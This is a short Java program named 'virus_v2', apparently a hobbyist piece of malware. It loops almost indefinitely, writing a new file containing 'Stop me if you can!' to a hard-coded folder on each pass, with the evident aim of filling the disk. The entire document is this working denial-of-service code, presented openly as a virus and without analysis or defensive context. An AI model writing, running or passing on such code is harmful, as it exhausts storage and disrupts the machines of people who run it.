import java.io.*;
class virus_v2
{
	public static void main(String args[])
	{
		String str="Stop me if you can!";
		byte[] b=str.getBytes();
		int n=1;
		while(n>0){
			try{
				FileOutputStream fw= new FileOutputStream("f:/virus/virus"+n+".txt");
				for(int i:b){
				fw.write(i);
				}
				fw.close();
			}
			catch(IOException e){
				System.out.println(e);
			}
			n++;
		}
		
	}
}